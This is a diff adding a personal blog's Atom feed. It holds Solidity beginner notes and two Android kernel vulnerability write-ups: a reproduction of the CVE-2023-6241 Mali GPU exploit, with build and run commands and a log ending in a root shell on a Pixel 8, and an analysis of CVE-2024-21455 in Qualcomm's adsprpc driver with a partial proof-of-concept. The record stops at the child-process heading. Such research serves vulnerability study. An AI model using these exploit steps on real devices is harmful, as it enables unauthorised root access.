@@ -1,0 +1,2073 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+    <id>https://lzxzl.github.io</id>
+    <title>ztree</title>
+    <updated>2025-01-03T15:39:17.560Z</updated>
+    <generator>https://github.com/jpmonette/feed</generator>
+    <link rel="alternate" href="https://lzxzl.github.io"/>
+    <link rel="self" href="https://lzxzl.github.io/atom.xml"/>
+    <logo>https://lzxzl.github.io/images/avatar.png</logo>
+    <icon>https://lzxzl.github.io/favicon.ico</icon>
+    <rights>All rights reserved 2025, ztree</rights>
+    <entry>
+        <title type="html"><![CDATA[solidity入门笔记]]></title>
+        <id>https://lzxzl.github.io/post/solidity-ru-men-bi-ji/</id>
+        <link href="https://lzxzl.github.io/post/solidity-ru-men-bi-ji/">
+        </link>
+        <updated>2024-12-31T16:16:34.000Z</updated>
+        <content type="html"><![CDATA[<ul>
+<li>2025.01.01: 0x00 &amp;&amp; 0x01</li>
+<li>2025.01.02: 0x02 ～ 0x04</li>
+<li>2025.01.03: 0x05~0x0A</li>
+</ul>
+<h1 id="0x00-primitive-data-types">0x00 Primitive Data Types</h1>
+<ul>
+<li><code>boolean</code></li>
+<li><code>uint8</code>, ... , <code>uint256</code></li>
+<li><code>int8</code>, ...,  <code>int256</code></li>
+<li><code>address</code></li>
+</ul>
+<pre><code class="language-solidity">// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.26;
+
+contract Primitives {
+    // [1] boolean 类型
+    bool public boo = true;
+
+    // [2] 整型
+    /* 
+    [2.1] 非负整数
+    uint stands for unsigned integer, meaning non negative integers
+    different sizes are available
+        uint8   ranges from 0 to 2 ** 8 - 1
+        uint16  ranges from 0 to 2 ** 16 - 1
+        ...
+        uint256 ranges from 0 to 2 ** 256 - 1
+    */
+    uint8 public u8 = 1;
+    uint256 public u256 = 456;
+    uint256 public u = 123; // uint is an alias for uint256
+
+    uint256 public maxUint = type(uint256).max; // 非负整数最大值：
+
+    /*
+    [2] 有符号整数
+    Negative numbers are allowed for int types.
+    Like uint, different ranges are available from int8 to int256
+    
+    int256 ranges from -2 ** 255 to 2 ** 255 - 1
+    int128 ranges from -2 ** 127 to 2 ** 127 - 1
+    */
+    int8 public i8 = -1;
+    int256 public i256 = 456;
+    int256 public i = -123; // int is same as int256
+
+    // minimum and maximum of int
+    int256 public minInt = type(int256).min;
+    int256 public maxInt = type(int256).max;
+
+    // [3] address  160 bits，20 bytes
+    address public addr = 0xCA35b7d915458EF540aDe6068dFe2F44E8fa733c;
+
+    // [4] bytes
+    /*
+    In Solidity, the data type byte represent a sequence of bytes. 
+    Solidity presents two type of bytes types :
+
+     - fixed-sized byte arrays 固定长度的字节数组
+     - dynamically-sized byte arrays. 动态长度的字节数组
+     
+     The term bytes in Solidity represents a dynamic array of bytes. 
+     It’s a shorthand for byte[] .
+    */
+    bytes1 a = 0xb5; //  [10110101]
+    bytes1 b = 0x56; //  [01010110]
+
+    // Default values
+    // Unassigned variables have a default value
+    bool public defaultBoo; // false 布尔默认是false
+    uint256 public defaultUint; // 0 整型默认是0
+    int256 public defaultInt; // 0
+    address public defaultAddr; // 0x0000000000000000000000000000000000000000 地址也默认是0
+}
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://lzxzl.github.io/post-images/1735661874909.png" alt="" loading="lazy"></figure>
+<h1 id="0x01-variables">0x01 Variables</h1>
+<p>三种类型的变量：</p>
+<ul>
+<li>local
+<ul>
+<li>declared inside a function</li>
+<li>not stored on the blockchain</li>
+</ul>
+</li>
+<li>state
+<ul>
+<li>declared outside a function</li>
+<li>stored on the blockchain</li>
+</ul>
+</li>
+<li><strong>global</strong> (provides information about the blockchain)</li>
+</ul>
+<pre><code class="language-solidity">// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.26;
+
+contract Variables {
+    // [2] 函数外声明的是state变量，存储在链上
+    // State variables are stored on the blockchain.
+    string public text = &quot;Hello&quot;;
+    uint256 public num = 123;
+
+    function doSomething() public view returns(uint256, address){
+        // [1] 函数内声明的是 local 变量，不会存储在链上
+        // Local variables are not saved to the blockchain.
+        uint256 i = 456;
+
+        // [3] 全局变量，提供关于区块链的信息
+        // Here are some global variables
+        uint256 timestamp = block.timestamp; // Current block timestamp
+        address sender = msg.sender; // address of the caller
+        return (timestamp, sender);
+    }
+}
+</code></pre>
+<figure data-type="image" tabindex="2"><img src="https://lzxzl.github.io/post-images/1735661888049.png" alt="" loading="lazy"></figure>
+<h1 id="0x02-constants">0x02 Constants</h1>
+<p>Constant不可被修改</p>
+<pre><code class="language-solidity">// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.26;
+
+contract Constants {
+    // 常量的声明在 public 和 常量名中间
+    // coding convention to uppercase constant variables
+    address public constant MY_ADDRESS =
+        0x777788889999AaAAbBbbCcccddDdeeeEfFFfCcCc;
+    uint256 public constant MY_UINT = 123;
+}
+</code></pre>
+<h1 id="0x03-immutable">0x03 Immutable</h1>
+<p>Immutable类似于Constant，但是immutable可以在构造函数内修改，不过之后就不能再修改了。</p>
+<pre><code class="language-solidity">// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.26;
+
+contract Immutable {
+    address public immutable myAddr;
+    uint256 public immutable myUint;
+
+    constructor(uint256 _myUint) {
+        myAddr = msg.sender;
+        myUint = _myUint;
+    }
+}
+
+</code></pre>
+<h1 id="0x04-reading-and-writing-to-a-state-variable">0x04 Reading and Writing to a State Variable</h1>
+<pre><code class="language-c">// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.26;
+
+contract SimpleStorage {
+    // State variable to store a number
+    uint256 public num;
+
+    // You need to send a transaction to write to a state variable.
+    // set，修改链上的变量，会消耗gas
+    function set(uint256 _num) public {
+        num = _num;
+    }
+
+    // You can read from a state variable without sending a transaction.
+    // get,读取不消耗gas
+    function get() public view returns (uint256) {
+        return num;
+    }
+}
+</code></pre>
+<figure data-type="image" tabindex="3"><img src="https://lzxzl.github.io/post-images/1735833635257.png" alt="" loading="lazy"></figure>
+<h1 id="0x05-ether-and-wei">0x05 Ether and Wei</h1>
+<p>交易用ether支付。类似于1美元等于100美分，1 ether等于 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>1</mn><msup><mn>0</mn><mn>18</mn></msup></mrow><annotation encoding="application/x-tex">10^{18}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">8</span></span></span></span></span></span></span></span></span></span></span></span> <code>wei</code>.</p>
+<pre><code class="language-solidity">// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.26;
+
+contract EtherUnits {
+    uint256 public oneWei = 1 wei;
+    // 1 wei is equal to 1
+    bool public isOneWei = (oneWei == 1);
+
+    uint256 public oneGwei = 1 gwei;
+    // 1 gwei is equal to 10^9 wei
+    bool public isOneGwei = (oneGwei == 1e9);
+
+    uint256 public oneEther = 1 ether;
+    // 1 ether is equal to 10^18 wei
+    bool public isOneEther = (oneEther == 1e18);
+}
+</code></pre>
+<h1 id="0x06-gas">0x06 Gas</h1>
+<ul>
+<li>
+<p>对于一份交易，需要支付多少 ether？</p>
+</li>
+<li>
+<p>答案是需要支付 <code>gas spent * gas price</code> 数量的ether</p>
+<ul>
+<li>
+<p>gas是一个计算单位</p>
+</li>
+<li>
+<p>gas spent是交易中使用的Gas总量</p>
+</li>
+<li>
+<p>gas price是你愿意为每个Gas单位支付的以太币数量</p>
+</li>
+</ul>
+</li>
+<li>
+<p>Gas价格较高的交易会被优先打包进区块。</p>
+</li>
+<li>
+<p>未使用的Gas会被退还。</p>
+</li>
+</ul>
+<p><strong>Gas Limit</strong></p>
+<p>你可以使用的Gas量有两个上限：</p>
+<ul>
+<li>gas limit (你愿意为你的交易使用的最大Gas量，由你设置)</li>
+<li>block gas limit (一个区块允许的最大Gas量，由网络设置)</li>
+</ul>
+<blockquote>
+<p>以太坊虚拟机（EVM）执行智能合约中的每个操作都需要消耗一定量的Gas。Gas的设计是为了防止无限循环和其他恶意代码占用网络资源。通过设置合适的Gas价格和Gas限制，你可以控制交易费用和确认速度。</p>
+</blockquote>
+<pre><code class="language-solidity">// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.26;
+
+contract Gas {
+    uint256 public i = 0;
+
+    // Using up all of the gas that you send causes your transaction to fail.
+    // State changes are undone.
+    // Gas spent is not refunded.
+    function forever() public {
+        // Here we run a loop until all of the gas are spent
+        // and the transaction fails
+        while (true) {
+            i += 1;
+        }
+    }
+}
+</code></pre>
+<p>这里演示了一个会导致交易失败的合约函数 <code>forever()</code>。  它包含一个无限循环，会不断增加变量<code>i</code>的值，直到消耗完所有提供的Gas。  由于交易失败，状态更改（<code>i</code> 的值增加）会被回滚，并且消耗的Gas也不会被退还。</p>
+<h1 id="0x07-if-else">0x07 If / Else</h1>
+<p>简单，如代码所示</p>
+<pre><code class="language-solidity">// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.26;
+
+contract IfElse {
+    function foo(uint256 x) public pure returns (uint256) {
+        if (x &lt; 10) {
+            return 0;
+        } else if (x &lt; 20) {
+            return 1;
+        } else {
+            return 2;
+        }
+    }
+
+    function ternary(uint256 _x) public pure returns (uint256) {
+        // if (_x &lt; 10) {
+        //     return 1;
+        // }
+        // return 2;
+
+        // shorthand way to write if / else statement
+        // the &quot;?&quot; operator is called the ternary operator
+        return _x &lt; 10 ? 1 : 2;
+    }
+}
+</code></pre>
+<h1 id="0x08-for-and-while-loop">0x08 For and While Loop</h1>
+<p>一般建议不要编写无限制的循环，因为这会达到gas限制，导致transaction失败。基于这个原因，while 和 do while 比较少用。使用方法和其他语言差不多，看代码。</p>
+<pre><code class="language-solidity">// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.26;
+
+contract Loop {
+    function loop() public pure {
+        // for loop
+        for (uint256 i = 0; i &lt; 10; i++) {
+            if (i == 3) {
+                // Skip to next iteration with continue
+                continue;
+            }
+            if (i == 5) {
+                // Exit loop with break
+                break;
+            }
+        }
+
+        // while loop
+        uint256 j;
+        while (j &lt; 10) {
+            j++;
+        }
+    }
+}
+
+</code></pre>
+<h1 id="0x09-mapping">0x09 Mapping</h1>
+<p>也简单，看代码。mapping的语法是：<code>mapping(key =&gt; value) public val_name</code></p>
+<pre><code class="language-solidity">// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.26;
+
+contract Mapping {
+    // Mapping from address to uint
+    // 键：address，值：uint256
+    mapping(address =&gt; uint256) public myMap;
+
+    function get(address _addr) public view returns (uint256) {
+        // Mapping always returns a value.
+        // If the value was never set, it will return the default value.
+        return myMap[_addr];
+    }
+
+    function set(address _addr, uint256 _i) public {
+        // Update the value at this address
+        myMap[_addr] = _i;
+    }
+
+    function remove(address _addr) public {
+        // Reset the value to the default value.
+        // 重设置为默认值
+        delete myMap[_addr];
+    }
+}
+
+// 嵌套mapping
+contract NestedMapping {
+    // Nested mapping (mapping from address to another mapping)
+    mapping(address =&gt; mapping(uint256 =&gt; bool)) public nested;
+
+    function get(address _addr1, uint256 _i) public view returns (bool) {
+        // You can get values from a nested mapping
+        // even when it is not initialized
+        return nested[_addr1][_i];
+    }
+
+    function set(address _addr1, uint256 _i, bool _boo) public {
+        nested[_addr1][_i] = _boo;
+    }
+
+    function remove(address _addr1, uint256 _i) public {
+        delete nested[_addr1][_i];
+    }
+}
+
+</code></pre>
+<h1 id="0xa-array">0xA Array</h1>
+<p>array可以是固定长度，也可以是动态长度的。</p>
+<ul>
+<li>Array.sol</li>
+</ul>
+<pre><code class="language-solidity">// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.26;
+
+contract Array {
+    // Several ways to initialize an array  
+    uint256[] public arr;                        // 动态长度array
+    uint256[] public arr2 = [1, 2, 3];           // 固定长度array
+    // Fixed sized array, all elements initialize to 0
+    uint256[10] public myFixedSizeArr;           // 固定长度数组，默认值均为0
+
+    function get(uint256 i) public view returns (uint256) { // 获取数组元素
+        return arr[i];
+    }
+
+    // Solidity can return the entire array.
+    // But this function should be avoided for
+    // arrays that can grow indefinitely in length.
+    function getArr() public view returns (uint256[] memory) { // 获取数组
+        return arr;
+    }
+
+    function push(uint256 i) public { // 往数组里加元素，数组长度加1
+        // Append to array
+        // This will increase the array length by 1.
+        arr.push(i);
+    }
+
+    function pop() public { // 从数组里移除最后一个元素，数组长度减1
+        // Remove last element from array
+        // This will decrease the array length by 1
+        arr.pop();
+    }
+
+    function getLength() public view returns (uint256) { // 获取数组长度
+        return arr.length;
+    }
+
+    function remove(uint256 index) public {  // 把对应index的元素的值设置为默认值，数组长度不变
+        // Delete does not change the array length.
+        // It resets the value at index to it's default value,
+        // in this case 0
+        delete arr[index];
+    }
+
+    function examples() external pure {
+        // create array in memory, only fixed size can be created
+        uint256[] memory a = new uint256[](5);
+    }
+}
+
+</code></pre>
+<blockquote>
+<p>external pure？</p>
+</blockquote>
+<ul>
+<li>自定义remove函数：通过从右向左移动元素来移除数组元素</li>
+</ul>
+<pre><code class="language-solidity">// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.26;
+
+contract ArrayRemoveByShifting {
+    // [1, 2, 3] -- remove(1) --&gt; [1, 3, 3] --&gt; [1, 3]
+    // [1, 2, 3, 4, 5, 6] -- remove(2) --&gt; [1, 2, 4, 5, 6, 6] --&gt; [1, 2, 4, 5, 6]
+    // [1, 2, 3, 4, 5, 6] -- remove(0) --&gt; [2, 3, 4, 5, 6, 6] --&gt; [2, 3, 4, 5, 6]
+    // [1] -- remove(0) --&gt; [1] --&gt; []
+
+    uint256[] public arr;
+
+    function remove(uint256 _index) public {
+    		// 边界检查
+        require(_index &lt; arr.length, &quot;index out of bound&quot;);
+				// 通过for循环，将从index+1开始的元素，全部逐个前移
+        for (uint256 i = _index; i &lt; arr.length - 1; i++) {
+            arr[i] = arr[i + 1];
+        }
+        // 删除最后一个元素，数组长度减1
+        arr.pop();
+    }
+
+    function test() external {
+    		// [1] 定义一个长度为5的数组
+        arr = [1, 2, 3, 4, 5];
+        // [2] 删除第3个元素
+        remove(2);
+        // [1, 2, 4, 5]
+        assert(arr[0] == 1);
+        assert(arr[1] == 2);
+        assert(arr[2] == 4);
+        assert(arr[3] == 5);
+        assert(arr.length == 4);
+
+        arr = [1];
+        remove(0);
+        // []
+        assert(arr.length == 0);
+    }
+}
+
+</code></pre>
+<ul>
+<li>自定义remove函数：通过将最后一个元素复制到要删除的位置来删除数组元素</li>
+</ul>
+<pre><code class="language-solidity">// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.26;
+
+contract ArrayReplaceFromEnd {
+    uint256[] public arr;
+
+    // Deleting an element creates a gap in the array.
+    // One trick to keep the array compact is to
+    // move the last element into the place to delete.
+    function remove(uint256 index) public {
+        // Move the last element into the place to delete
+        // 将数组最后一个元素拷贝到要删除的index
+        arr[index] = arr[arr.length - 1];
+        // Remove the last element
+        // 然后pop最后一个元素
+        arr.pop();
+    }
+
+    function test() public {
+        arr = [1, 2, 3, 4];
+
+        remove(1);
+        // [1, 4, 3]
+        assert(arr.length == 3);
+        assert(arr[0] == 1);
+        assert(arr[1] == 4);
+        assert(arr[2] == 3);
+
+        remove(2);
+        // [1, 4]
+        assert(arr.length == 2);
+        assert(arr[0] == 1);
+        assert(arr[1] == 4);
+    }
+}
+
+</code></pre>
+<h1 id="参考文献">参考文献</h1>
+<ul>
+<li>https://solidity-by-example.org/</li>
+</ul>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[CVE-2023-6241分析与复现]]></title>
+        <id>https://lzxzl.github.io/post/cve-2023-6241-fen-xi-yu-fu-xian/</id>
+        <link href="https://lzxzl.github.io/post/cve-2023-6241-fen-xi-yu-fu-xian/">
+        </link>
+        <updated>2024-12-30T18:23:31.000Z</updated>
+        <summary type="html"><![CDATA[<blockquote>
+<p>对这篇文章 <a href="https://github.blog/security/vulnerability-research/gaining-kernel-code-execution-on-an-mte-enabled-pixel-8/">Gaining kernel code execution on an MTE-enabled Pixel 8</a> 的分析与复现<br>
+Arm Mali GPU<br>
+（买了台 pixel8，也刚好拿来当备用机~）</p>
+</blockquote>
+<ul>
+<li>镜像版本：<a href="https://developers.google.com/android/images?hl=zh-cn">UD1A.231105.004</a></li>
+<li>ndk版本：26.2.11394342</li>
+<li>open-cl header版本：<a href="https://github.com/KhronosGroup/OpenCL-Headers/releases/tag/v2023.04.17">v2023.04.17</a></li>
+</ul>
+<h1 id="复现">复现</h1>
+<ul>
+<li>编译</li>
+</ul>
+<pre><code class="language-bash"># 1. 拉依赖库
+╰─ adb pull vendor/lib64/egl/libGLES_mali.so .
+
+# 2. 拷贝opencl header到exp目录
+╰─ cp -r ../OpenCL-Headers-2023.04.17/CL .
+
+# 3. 编译
+╰─ /Users/lzx/Library/Android/sdk/ndk/26.2.11394342/toolchains/llvm/prebuilt/darwin-x86_64/bin/aarch64-linux-android34-clang -DSHELL -DCL_TARGET_OPENCL_VERSION=300 -I. -L. mali_jit_csf.c mem_read_write.c mempool_utils.c -lGLES_mali -o mali_jit_csf
+
+# 4. 得到 mali_jit_csf
+</code></pre>
+<ul>
+<li>运行</li>
+</ul>
+<pre><code class="language-bash">╰─ adb push mali_jit_csf /data/local/tmp
+
+╰─ adb shell
+shiba:/ $ cd /data/local/tmp
+shiba:/data/local/tmp $ LD_LIBRARY_PATH=/vendor/lib64/egl ./mali_jit_csf
+mali_fd 3
+corrupted_jit_addr 6000001000
+kernel success
+kernel success
+queue kernel
+jit_grow addr 6000001000
+Size after grow: 22f6
+Final grow size: 23c7
+keep alive jit_addr 60023d1000
+Size after free: 21fd, trim_level 6
+writing to gpu_va 6002301000
+found reused page 5fffef6000, 0
+pgd entry found at index 0 400008972ef443
+overwrite addr : 5ffff00b50 b50
+overwrite addr : 5fffb00b50 b50
+overwrite addr : 5fff900b50 b50
+overwrite addr : 5ffff00714 714
+overwrite addr : 5fffb00714 714
+overwrite addr : 5fff900714 714
+result 50
+shiba:/data/local/tmp # id
+uid=0(root) gid=0(root) groups=0(root) context=u:r:kernel:s0
+shiba:/data/local/tmp # getenforce
+getenforce: Couldn't get enforcing status: No such file or directory
+1|shiba:/data/local/tmp # ^C
+130|shiba:/data/local/tmp # ^D
+shiba:/data/local/tmp $
+</code></pre>
+<p>第一次运行的时候，确实如readme里所说卡住了，第二次运行就没事了。</p>
+<blockquote>
+<p>When running the first time, the exploit sometimes stalls after printing the last <code>overwrite addr</code> message. If that happens (stalled for more than 10 seconds, though pausing for a few seconds is normal), then simply kill the exploit and rerun it. It should not stall the second time.</p>
+</blockquote>
+<h1 id="漏洞根因">漏洞根因</h1>
+<h1 id="poc">PoC</h1>
+<h1 id="patch">Patch</h1>
+<h1 id="结论">结论</h1>
+<h1 id="参考文献">参考文献</h1>
+<ul>
+<li>https://github.blog/security/vulnerability-research/gaining-kernel-code-execution-on-an-mte-enabled-pixel-8/</li>
+<li>https://github.com/github/securitylab/tree/main/SecurityExploits/Android/Mali/CVE_2023_6241</li>
+<li>https://developers.google.com/android/images?hl=zh-cn</li>
+<li>https://github.com/KhronosGroup/OpenCL-Headers/releases/tag/v2023.04.17</li>
+</ul>
+]]></summary>
+        <content type="html"><![CDATA[<blockquote>
+<p>对这篇文章 <a href="https://github.blog/security/vulnerability-research/gaining-kernel-code-execution-on-an-mte-enabled-pixel-8/">Gaining kernel code execution on an MTE-enabled Pixel 8</a> 的分析与复现<br>
+Arm Mali GPU<br>
+（买了台 pixel8，也刚好拿来当备用机~）</p>
+</blockquote>
+<ul>
+<li>镜像版本：<a href="https://developers.google.com/android/images?hl=zh-cn">UD1A.231105.004</a></li>
+<li>ndk版本：26.2.11394342</li>
+<li>open-cl header版本：<a href="https://github.com/KhronosGroup/OpenCL-Headers/releases/tag/v2023.04.17">v2023.04.17</a></li>
+</ul>
+<h1 id="复现">复现</h1>
+<ul>
+<li>编译</li>
+</ul>
+<pre><code class="language-bash"># 1. 拉依赖库
+╰─ adb pull vendor/lib64/egl/libGLES_mali.so .
+
+# 2. 拷贝opencl header到exp目录
+╰─ cp -r ../OpenCL-Headers-2023.04.17/CL .
+
+# 3. 编译
+╰─ /Users/lzx/Library/Android/sdk/ndk/26.2.11394342/toolchains/llvm/prebuilt/darwin-x86_64/bin/aarch64-linux-android34-clang -DSHELL -DCL_TARGET_OPENCL_VERSION=300 -I. -L. mali_jit_csf.c mem_read_write.c mempool_utils.c -lGLES_mali -o mali_jit_csf
+
+# 4. 得到 mali_jit_csf
+</code></pre>
+<ul>
+<li>运行</li>
+</ul>
+<pre><code class="language-bash">╰─ adb push mali_jit_csf /data/local/tmp
+
+╰─ adb shell
+shiba:/ $ cd /data/local/tmp
+shiba:/data/local/tmp $ LD_LIBRARY_PATH=/vendor/lib64/egl ./mali_jit_csf
+mali_fd 3
+corrupted_jit_addr 6000001000
+kernel success
+kernel success
+queue kernel
+jit_grow addr 6000001000
+Size after grow: 22f6
+Final grow size: 23c7
+keep alive jit_addr 60023d1000
+Size after free: 21fd, trim_level 6
+writing to gpu_va 6002301000
+found reused page 5fffef6000, 0
+pgd entry found at index 0 400008972ef443
+overwrite addr : 5ffff00b50 b50
+overwrite addr : 5fffb00b50 b50
+overwrite addr : 5fff900b50 b50
+overwrite addr : 5ffff00714 714
+overwrite addr : 5fffb00714 714
+overwrite addr : 5fff900714 714
+result 50
+shiba:/data/local/tmp # id
+uid=0(root) gid=0(root) groups=0(root) context=u:r:kernel:s0
+shiba:/data/local/tmp # getenforce
+getenforce: Couldn't get enforcing status: No such file or directory
+1|shiba:/data/local/tmp # ^C
+130|shiba:/data/local/tmp # ^D
+shiba:/data/local/tmp $
+</code></pre>
+<p>第一次运行的时候，确实如readme里所说卡住了，第二次运行就没事了。</p>
+<blockquote>
+<p>When running the first time, the exploit sometimes stalls after printing the last <code>overwrite addr</code> message. If that happens (stalled for more than 10 seconds, though pausing for a few seconds is normal), then simply kill the exploit and rerun it. It should not stall the second time.</p>
+</blockquote>
+<h1 id="漏洞根因">漏洞根因</h1>
+<h1 id="poc">PoC</h1>
+<h1 id="patch">Patch</h1>
+<h1 id="结论">结论</h1>
+<h1 id="参考文献">参考文献</h1>
+<ul>
+<li>https://github.blog/security/vulnerability-research/gaining-kernel-code-execution-on-an-mte-enabled-pixel-8/</li>
+<li>https://github.com/github/securitylab/tree/main/SecurityExploits/Android/Mali/CVE_2023_6241</li>
+<li>https://developers.google.com/android/images?hl=zh-cn</li>
+<li>https://github.com/KhronosGroup/OpenCL-Headers/releases/tag/v2023.04.17</li>
+</ul>
+<!-- more -->
+<!-- more -->
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[CVE-2024-21455 is_compat flag leads to access of userland provided addresses as kernel pointers]]></title>
+        <id>https://lzxzl.github.io/post/cve-2024-21455-is_compat-flag-leads-to-access-of-userland-provided-addresses-as-kernel-pointers/</id>
+        <link href="https://lzxzl.github.io/post/cve-2024-21455-is_compat-flag-leads-to-access-of-userland-provided-addresses-as-kernel-pointers/">
+        </link>
+        <updated>2024-12-26T17:15:14.000Z</updated>
+        <content type="html"><![CDATA[<blockquote>
+<p>qualcomm-dsp-driver: adsprpc</p>
+</blockquote>
+<h1 id="漏洞">漏洞</h1>
+<p>为了支持 32 位用户空间进程，64 位内核包含一个可以支持 <code>ioctl</code> 的“兼容层”（compatibility layer）。这个层的职责是将 32 位结构体转换为它们的 64 位等价结构体，这涉及将 32 位用户空间指针“扩展”为 64 位指针。<code>adsprpc</code> 驱动在 <code>adsprpc_compat.c</code> 文件中处理这种情况。它会分配内核内存，将 32 位结构体拷贝并转换为 64 位结构体，然后调用 64 位的 <code>ioctl</code> 接口。因此，64 位的 <code>ioctl</code> 接口必须处理来自 32 位内核兼容层的调用以及直接来自 64 位用户空间的调用。</p>
+<p>为了支持这种功能，32 位兼容层通过在与文件描述符绑定的 <code>fl</code> 结构体（<code>fastrpc_file</code>）中设置 <code>is_compat</code> 标志，向更广泛的 <code>adsprpc</code> 驱动表明当前调用来自 32 位兼容层。</p>
+<pre><code class="language-c">long compat_fastrpc_device_ioctl(struct file *filp, unsigned int cmd,
+                                 unsigned long arg)
+{
+        int err = 0;
+        struct fastrpc_file *fl = (struct fastrpc_file *)filp-&gt;private_data;
+        if (!filp-&gt;f_op || !filp-&gt;f_op-&gt;unlocked_ioctl)
+                return -ENOTTY;
+        fl-&gt;is_compat = true; // 设置is_compat flag为true
+        ...
+}
+</code></pre>
+<p>稍后，在调用 <code>K_COPY_FROM_USER</code> 时会使用 <code>is_compat</code> 标志来决定是使用 <code>memmove</code>（适用于 32 位兼容层或其他内核调用）还是 <code>copy_from_user</code>。</p>
+<pre><code class="language-c">#define K_COPY_FROM_USER(err, kernel, dst, src, size) \
+        do {\
+                if (!(kernel))\
+                        err = copy_from_user((dst),\
+                        (void const __user *)(src),\
+                        (size));\
+                else\
+                        memmove((dst), (src), (size));\
+        } while (0)
+</code></pre>
+<p>函数 <code>fastrpc_internal_invoke2</code> 的片段如下：</p>
+<pre><code class="language-c">int fastrpc_internal_invoke2(struct fastrpc_file *fl,
+                             struct fastrpc_ioctl_invoke2 *inv2)
+{
+        switch (inv2-&gt;req) {
+        case FASTRPC_INVOKE2_ASYNC:
+                ...
+                        K_COPY_FROM_USER(err, fl-&gt;is_compat, &amp;p.inv3, (void*)inv2-&gt;invparam, sizeof(struct fastrpc_ioctl_invoke_async_no_perf));
+                ...
+        }
+}
+</code></pre>
+<p>然而，这个 <code>is_compat</code> 标志被设置在一个相对全局的级别上，因此对同一文件描述符的任何其他 <code>ioctl</code> 调用都会看到该标志已被设置。此外，一旦该标志被设置，就永远不会被重置。以下是一个可能的恶意场景：</p>
+<ol>
+<li>一个恶意的 64 位进程 A 打开了 <code>adsprpc-smd</code> 文件，创建了一个新的 <code>adsprpc</code> 文件描述符。</li>
+<li>进程 A 调用 <code>fork</code>，创建了一个新的 32 位进程 B（A 和 B 共享 <code>adsprpc</code> fd/fl）。</li>
+<li>进程 B 调用 32 位的 <code>ioctl</code> 接口（从而设置了 <code>is_compat</code> 标志）并退出。</li>
+<li>进程 A 调用 64 位的 <code>ioctl</code> 接口。</li>
+</ol>
+<p>在这种情况下，驱动程序错误地认为请求来自 32 位兼容层（因为 <code>is_compat</code> 被设置了），并尝试将<code>(void*)inv2-&gt;invparam</code>作为内核指针进行访问，而实际上这是一个来自 64 位用户空间的不可信用户空间指针（在恶意情况下，这些指针可能是内核地址）(<code>copy_from_user</code>的src)。随后内核将使用不安全的 <code>memmove</code> 来访问这些指针，从而导致用户空间控制的内核地址读操作。</p>
+<blockquote>
+<p>memove函数：将内存区域中的一段数据复制到另一段内存区域中</p>
+<pre><code class="language-c">void *memmove(void *dest, const void *src, size_t n);
+// dest: 目标地址指针，表示数据要复制到的内存区域的起始地址
+// src: 源地址指针，表示数据要复制的内存区域的起始地址。
+// n: 要复制的字节数
+</code></pre>
+</blockquote>
+<h2 id="漏洞模式小结">漏洞模式小结</h2>
+<ul>
+<li>
+<ol>
+<li>有兼容层</li>
+</ol>
+</li>
+<li>
+<ol start="2">
+<li>表明兼容层的<code>is_compat</code> 标志被设置在一个相对全局的级别上</li>
+</ol>
+<ul>
+<li>对同一文件描述符的任何其他 <code>ioctl</code> 调用都会看到该标志已被设置</li>
+<li>一旦该标志被设置，就永远不会被重置或者存在情况不会被重置</li>
+</ul>
+</li>
+</ul>
+<blockquote>
+<p>比如该漏洞的<code>is_compat</code>就存储在父子进程共享的<code>fastrpc_file</code>里</p>
+</blockquote>
+<ul>
+<li>
+<ol start="3">
+<li>驱动对用户态传入地址的处理在同一个地方。</li>
+</ol>
+</li>
+</ul>
+<h1 id="poc">PoC</h1>
+<ul>
+<li>父进程</li>
+</ul>
+<pre><code class="language-c">int main() {
+    int adsprpc_fd = open(&quot;/dev/adsprpc-smd&quot;,O_RDONLY); // [1] 恶意的 64 位进程 A 打开了 `adsprpc-smd` 文件，创建了一个新的 `adsprpc` 文件描述符。
+    if(adsprpc_fd == -1) {
+        printf(&quot;open: %m\n&quot;);
+        return 1;
+    }
+    printf(&quot;opened fd %d\n&quot;, adsprpc_fd);
+
+    uint32_t info = 3; // 0 is privileged, 3 is unprivileged
+    int getinfo_res = ioctl(adsprpc_fd, FASTRPC_IOCTL_GETINFO, &amp;info);
+    printf(&quot;getinfo returned %d\n&quot;, getinfo_res);
+
+    printf(&quot;invoking child\n&quot;);
+    char* arg[] = {&quot;./poc_compat&quot;, NULL};
+    if(!fork()) { // [2] 进程 A 调用 `fork`，创建了一个新的 32 位进程 B（A 和 B 共享 `adsprpc` fd/fl）。
+        execve(&quot;./poc_compat&quot;,arg,NULL); // 子进程执行poc_compat
+        printf(&quot;execve: %m\n&quot;);
+        return 1;
+    }
+    int ret = waitpid(-1,NULL,0);
+    if(ret &lt; 0)
+    {
+        printf(&quot;waitpid: %m\n&quot;);
+        return 1;
+    }
+    printf(&quot;child exited\n&quot;);
+    struct fastrpc_ioctl_invoke2 p = {
+        .req = FASTRPC_INVOKE2_ASYNC,
+        .invparam = 0xffffffff41414141,
+        .size = 8
+    };
+    errno = 0;
+    int res = ioctl(adsprpc_fd,FASTRPC_IOCTL_INVOKE2,&amp;p); // [4] 进程 A 调用 64 位的 `ioctl` 接口
+    printf(&quot;invoke2 called, returned %d (%m)\n&quot;, res);
+}
+</code></pre>
+<ul>
+<li>子进程</li>
+</ul>
